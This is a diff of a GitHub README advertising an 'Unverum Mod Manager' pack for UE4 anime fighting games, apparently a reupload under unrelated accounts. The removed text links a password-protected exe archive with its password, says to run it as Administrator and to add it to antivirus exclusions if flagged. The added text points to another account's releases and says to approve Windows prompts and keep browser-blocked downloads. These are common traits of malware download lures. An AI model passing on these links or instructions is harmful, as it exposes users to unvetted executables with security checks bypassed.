@@ -1,91 +1,179 @@
-# Unverum Mod Manager Latest 2026 – UE4 Anime Games Mod Installer & Manager Pack
-[![Stars](https://img.shields.io/github/stars/carextwo/Unverum-Mod-Manager-For-Anime-Games)](https://github.com/carextwo/Unverum-Mod-Manager-For-Anime-Games) [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+# 🎮 Unverum-Mod-Manager-For-Anime-Games - Easy mod installs for anime fighters
 
-Complete ready-to-use **Unverum Mod Manager** setup — the ultimate tool to **download, install and manage mods** for Unreal Engine 4 anime fighting games. Easy one-click mod installation from GameBanana, auto-updates, conflict resolution, mod enabling/disabling without restarting. 
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/mostafizur179/Unverum-Mod-Manager-For-Anime-Games/releases)
 
-## Supported Games
+## 🧩 What this is
+
+Unverum Mod Manager is a Windows tool for installing and managing mods for anime fighting games made with UE4. It helps you add mods with a few clicks, keep them up to date, and use GameBanana files with less work.
+
+It is made for players who want a simple way to handle mods for games like:
+
 - Dragon Ball FighterZ
-- My Hero One's Justice 2
-- Granblue Fantasy: Versus
-- Granblue Fantasy Versus: Rising
-- Guilty Gear -Strive
-- Jump Force
-- Kingdom Hearts III
-- Scarlet Nexus
-- Tales of Arise
-- Demon Slayer: The Hinokami Chronicles
-- THE IDOLM@STER STARLIT SEASON
-- Shin Megami Tensei V
-- The King of Fighters XV
-- DNF Duel
+- Guilty Gear Strive
+- Dragon Ball Sparking! ZERO
 
----
-## ⚠️ Disclaimer
-This repository is for educational and testing purposes only. All files are provided as-is. Use at your own risk. Modding may violate game ToS — backup your game files. Not affiliated with original developers or TekkaGB.
+## ✨ What it can do
 
----
-## 📦 What's Included
-- Latest **Unverum Mod Manager** build (2026 compatible)
-- Pre-configured profiles for popular games (DBFZ, GG Strive, GBVS Rising, Sparking ZERO)
-- Integration with GameBanana for direct mod downloads & auto-updates
-- Mod conflict detector + easy toggle on/off
-- Offline-ready configs + backup/restore tools
-- Extras: quick setup scripts, exclusion filters, Steam Deck compatibility notes
+- Install mods with one click
+- Keep mods organized in one place
+- Support GameBanana downloads
+- Auto-update when new versions are available
+- Help manage UE4 game files
+- Make it easier to turn mods on or off
+- Work with common anime fighter mod packs
 
----
-## 📥 Download
-Password-protected archive with the complete Unverum package – extract and start modding instantly.  
+## 💻 What you need
 
-📥 [Download `Unverum.zip`](https://github.com/carextwo/Unverum-Mod-Manager-For-Anime-Games/releases/download/Game-Software/Unverum.zip)  
-🔐 `LS2026`
----
-### Archive Contents
-- `Unverum.exe` – main application (latest build)
-- `configs/` – ready profiles (DBFZ, GG Strive, Sparking ZERO)
-- `setup_guide.txt` – quick start instructions + troubleshooting
-- `extras/` – bonus exclusion filters, mod templates, restore script
+Use a Windows PC with:
 
----
-## 🚀 Quick Start (Recommended for Easy Modding)
-1. Extract the archive anywhere  
-2. Run `Unverum.exe` as Administrator  
-3. Point to your game root folder (e.g., Dragon Ball FighterZ install dir)  
-4. Connect to GameBanana (optional but recommended for auto-downloads)  
-5. Browse & install mods directly in Unverum  
-6. Enable desired mods → launch game normally (Steam/Epic)  
-7. Enjoy custom characters, stages, movesets and more!
+- Windows 10 or Windows 11
+- An internet connection for the first download
+- Enough free disk space for the app and your mods
+- One of the supported games installed on your PC
 
-> ℹ️ Best results: Use with GameBanana mods. Perfect for **unverum mod manager**, **dragon ball fighterz mods 2026** and **guilty gear strive mod manager** on Windows/Steam Deck.
+For best results:
 
----
-## 🎮 Popular Configurations
-| Mode              | Best For                     | Key Settings                          | Expected Result                          |
-|-------------------|------------------------------|---------------------------------------|------------------------------------------|
-| DBFZ Full Mods    | Dragon Ball FighterZ         | Auto-update + conflict resolver       | Custom characters, stages, UI            |
-| GG Strive         | Guilty Gear -Strive-         | Exclusion filters for patches         | New movesets, costumes, music            |
-| GBVS Rising       | Granblue Fantasy Versus      | One-click install from GameBanana     | Anime-style enhancements & balance mods  |
-| Sparking ZERO     | Dragon Ball Sparking! ZERO   | Latest exclusion rules                | Massive roster mods & transformations    |
-| Multi-Game        | All supported titles         | Separate profiles per game            | Easy switching between games             |
+- Close the game before changing mods
+- Use a normal user account with write access to the game folder
+- Keep your game files in their default Steam folder if possible
 
-All mods toggleable in-app with real-time preview where supported.
+## 🚀 Download and install
 
----
-## ❗️ Troubleshooting
-| Problem                        | Solution                                                                 |
-|--------------------------------|--------------------------------------------------------------------------|
-| Unverum won't detect game      | Manually select root folder + run as Admin                               |
-| Mods not applying              | Reboot game / check for conflicts in Unverum → disable conflicting mods  |
-| Game crashes after install     | Use exclusion filters or restore backup                                  |
-| GameBanana not connecting      | Check internet + firewall; use manual .pak install if needed             |
-| Antivirus flags exe            | Add to exclusions – common for mod tools                                 |
-| Steam Deck / Proton issues     | Add Unverum.exe to Steam + force Proton 8+                               |
+1. Visit the [Releases page](https://github.com/mostafizur179/Unverum-Mod-Manager-For-Anime-Games/releases)
+2. Find the latest release at the top of the page
+3. Download the Windows file from the release assets
+4. Open the file after the download finishes
+5. If Windows asks for permission, choose **Yes**
+6. Follow the setup steps shown on screen
+7. Start the app from the shortcut or the folder where you installed it
 
----
-## 📜 License
-MIT License – shared for educational purposes only.
+If your browser blocks the file, keep the download and open it from your Downloads folder.
 
----
-## ⭐️ Support
-If this **Unverum Mod Manager** pack helped you easily install mods for Dragon Ball FighterZ, Guilty Gear Strive, Sparking ZERO and other UE4 anime games — please star the repository! It helps others discover the best **unverum mod manager 2026** tool. 🚀
+## 🛠️ First-time setup
 
----
+After you open Unverum for the first time:
+
+1. Pick the game you want to manage
+2. Point the app to your game folder if asked
+3. Let the app scan your files
+4. Choose a mod from your list or GameBanana
+5. Install the mod
+6. Launch the game and check that the mod is active
+
+If the app asks for a game path, use the folder that contains the game files, not the Steam shortcut.
+
+## 🎯 Supported games
+
+This mod manager is built for anime fighters and UE4 games in the same family. It works best with:
+
+- Dragon Ball FighterZ
+- Guilty Gear Strive
+- Dragon Ball Sparking! ZERO
+
+It may also help with other UE4-based anime games that use a similar mod structure.
+
+## 📁 How mod files work
+
+Unverum helps place mod files in the right spot, so you do not need to copy files by hand.
+
+Common mod types include:
+
+- Character swaps
+- Costume changes
+- UI edits
+- Sound and music edits
+- Texture changes
+- Gameplay tweaks
+
+If a mod comes in a ZIP or RAR file, keep it packed unless the mod page tells you to extract it first.
+
+## 🔧 Using GameBanana
+
+If you download mods from GameBanana:
+
+1. Open the mod page
+2. Download the file
+3. Open Unverum
+4. Import or select the mod file
+5. Install it to the game
+
+This saves time and helps you avoid manual file moves.
+
+## 🧭 How to update
+
+When a new version comes out:
+
+1. Go to the [Releases page](https://github.com/mostafizur179/Unverum-Mod-Manager-For-Anime-Games/releases)
+2. Download the newest build
+3. Close the old version
+4. Open the new file
+5. Let the app update if it asks
+
+If your mods stop working after an update, reinstall them in the app and test the game again.
+
+## 🧼 If something does not work
+
+Try these steps:
+
+- Make sure the game is closed before you install or remove mods
+- Check that you picked the right game folder
+- Run the app as an administrator
+- Remove broken mods one at a time
+- Redownload the mod if the file looks damaged
+- Restart Steam and the app
+- Verify the game files in Steam if the game will not start
+
+## 🗂️ Common folder tips
+
+Use these tips to avoid setup problems:
+
+- Do not point the app to a shortcut
+- Use the main game folder with the game files inside
+- Keep mod files in a separate folder for easy access
+- Do not rename game folders after setup unless you update the path in Unverum
+
+## 🔒 Safe mod use
+
+Mods can change how a game runs. Keep a backup of important files before you start. If you want to return to the base game, remove the mods through Unverum and launch the game again
+
+## ❓ FAQ
+
+### Does this work on Windows?
+Yes. This app is made for Windows users.
+
+### Do I need programming skills?
+No. You only need to download the file, open it, and follow the steps.
+
+### Can I use this with Steam?
+Yes. It is made to work with Steam installs for supported games.
+
+### Can I install more than one mod?
+Yes. You can manage multiple mods and turn them on or off as needed.
+
+### Do I need to edit game files by hand?
+No. Unverum handles the file placement for you.
+
+### Where do I get the latest version?
+Use the [Releases page](https://github.com/mostafizur179/Unverum-Mod-Manager-For-Anime-Games/releases)
+
+## 🧰 Typical use case
+
+A player wants to add a new character mod to Dragon Ball FighterZ. They open Unverum, select the game, import the mod, install it, and launch the game. The mod is now in place without manual file copying.
+
+## 📌 Topics covered
+
+- anime games
+- DBFZ
+- Dragon Ball
+- fighting games
+- GameBanana
+- Guilty Gear Strive
+- mod installer
+- mod loader
+- mod manager
+- modding tool
+- mods
+- Steam Deck
+- UE4
+- Unreal Engine
+- Unverum
